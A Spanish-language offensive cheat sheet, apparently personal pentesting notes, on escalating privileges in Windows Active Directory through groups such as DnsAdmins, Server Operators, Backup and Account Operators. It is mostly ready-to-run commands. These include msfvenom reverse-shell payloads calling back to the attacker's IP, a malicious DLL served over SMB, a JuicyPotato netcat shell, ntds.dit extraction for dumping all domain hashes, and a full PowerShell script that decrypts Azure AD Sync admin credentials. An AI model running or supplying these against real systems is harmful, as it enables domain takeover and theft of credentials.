## DnsAdmins

Gracias a pertenecer a este grupo podemos escalar privilegios de la siguiente forma:
- Creamos un archivo `dll` malicioso:

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LOCAL_IP> LPORT=<PORT> -f dll -o <FILENAME>.dll
```

- Creamos un servidor `SMB` para compartirlo a nivel de red:

```shell
impacket-smbserver smbFolder $(pwd) -smb2support 
```

- Con `dnscmd` ejecutamos este comando:

```powershell
dnscmd <HOSTNAME> /config /serverlevelplugindll \\<LOCAL_IP>\smbFolder\<FILENAME>.dll
```

- Apagar el servicio **DNS**:

```shell
sc.exe stop dns
```

- Y lo volvemos a encender:

```shell
sc.exe start dns
```

Ahora gracias a esto en tu `netcat` deberías haber obtenido una shell.

## Server Operators

Esta escalada de privilegios es bastante parecida a la anterior:

- Generamos un `exe` malicioso:

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LOCAL_IP> LPORT=<PORT> -f exe -o <FILENAME>.exe
```

- Lo compartimos de alguna manera, ya sea con un servidor de `SMB`. 
- Ahora con `sc` asignamos nuestro `exe` al binpath del servicio a reiniciar:

```shell
sc.exe config VSS binpath="path\to\malicious\file.exe"
```

- Ahora, como antes, apagamos el servicio **VSS** y lo volvemos a encender:

```shell
sc.exe stop VSS
```

```shell
sc.exe start VSS
```

Esto otorgará una shell.

## SeBackupPrivilege

Este grupo nos otorgará el privilegio `SeBackupPrivilege`. Para escalar privilegios desde aquí es muy fácil:

- Creamos un archivo `dsh`:

```d
set context persistent nowriters
add volume c: alias ruy
create
expose %ruy% z:
```

- Lo convertimos con `unix2dos`:

```shell
unix2dos ruy.dsh
```

- Ahora lo subimos a la máquina víctima y se lo pasamos a `diskshadow` como comandos:

```shell
diskshadow /s ruy.dsh
```

- Después nos copiamos el `ntds.dit`:

```shell
robocopy /b f:\windows\ntds . ntds.dit
```

- Ahora nos copiamos el `system`:

```shell
reg save hklm\system c:\Temp\system
```

- Nos transferimos estos archivos a nuestra máquina y los dumpeamos con `secretsdump`:

```shell
impacket-secretsdump -ntds ntds.dit -system system local
```

Esto nos reportará todos los hashes del dominio.

## SeImpersonatePrivilege

Este privilegio es bastante interesante ya que nos permite actuar como otro usuario. Explotarlo es fácil, solo sigue estos pasos:

- Transfiere [JuicyPotato](https://github.com/ohpe/juicy-potato) a la máquina víctima
- Transfiere netcat a la máquina víctima
- Ejecuta el siguiente comando:

```shell
.\JuicyPotatoNG.exe -t * -p "path\to\nc.exe" -a "<LOCAL_IP> <PORT> -e cmd"
```

Para entender como funciona está en mi web explicado medianamente bien.

## AD Recycle Bin

Si pertenecemos a este grupo podemos ver los objetos borrados en la papelera de reciclaje:

```powershell
Get-ADObject -Filter {Deleted -eq $true -and ObjectClass -eq "user"} -IncludeDeletedObjects -Properties *
```

## Azure Admins

Si vemos el directorio `C:\Program Files\Microsoft Azure AD Sync` podemos escalar privilegios gracias a este [exploit](https://github.com/VbScrub/AdSyncDecrypt/releases) de [VbScrub](https://github.com/VbScrub)

```powershell
cd "C:\Program Files\Microsoft Azure AD Sync\Bin"
C:\ProgramData\AdDecrypt.exe -FullSQL
```

Y así se nos listaran las credenciales del admin del dominio:

![[Pasted image 20230718163621.png]]

El exploit está estructurado en tres pasos:

- Consigue info de la DB y obtiene las claves de encriptación del KeyManager.
- Consigue la configuración y la contraseña encriptada de la DC.
- Busca las claves y decodea la contraseña.

### Buscando la Key Information

```powershell
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True" $client.Open() $cmd = $client.CreateCommand() $cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration" $reader = $cmd.ExecuteReader() $reader.Read() | Out-Null $key_id = $reader.GetInt32(0) $instance_id = $reader.GetGuid(1) $entropy = $reader.GetGuid(2) $reader.Close()
```
### Busca la configuración

```powershell
$cmd = $client.CreateCommand() $cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'" $reader = $cmd.ExecuteReader() $reader.Read() | Out-Null $config = $reader.GetString(0) $crypted = $reader.GetString(1) $reader.Close()
```

### Decodear la contraseña

```powershell
add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll' $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager $km.LoadKeySet($entropy, $instance_id, $key_id) $key = $null $km.GetActiveCredentialKey([ref]$key) $key2 = $null $km.GetKey(1, [ref]$key2)
$decrypted = $null $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}} $username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}} $password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}} Write-Host ("Domain: " + $domain.Domain) Write-Host ("Username: " + $username.Username) Write-Host ("Password: " + $password.Password)
```

## Account Operators

Empezaremos creando un nuevo usuario:

```c
net user <USUARIO> <CONTRASEÑA> /add /domain
```

Ahora necesitaríamos añadir al usuario creado al grupo que tenga `DCSync` con el DC o a un grupo que tenga `WriteDacl` sobre el DC, para así poder efectuar un `DCSync` y ver todos los hashes:

```c
net group "<GRUPO>" <USUARIO> /add
```

En caso de que el usuario que pertenezca a Account Operators no pertenezca a Remote Management Users:

```powershell
Import-Module .\PowerView.ps1
$pass = ConvertTo-SecureString '<CONTRASEÑA>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<USUARIO>', $pass)
New-AdUser ruy -credential $cred -enabled $true -accountpassword $pass
Add-DomainGroupMember -Identity <GRUPO> -Credential $cred -Members 'ruy'
```

Ahora también nos podemos añadir (ruycr4ft) al grupo LAPS Reader, así podemos leer las contraseñas de los administradores del dominio:

```powershell
Add-DomainGroupMember -Identity '<GRUPO_LAPS>' -Credential $cred -Members 'ruycr4ft'
```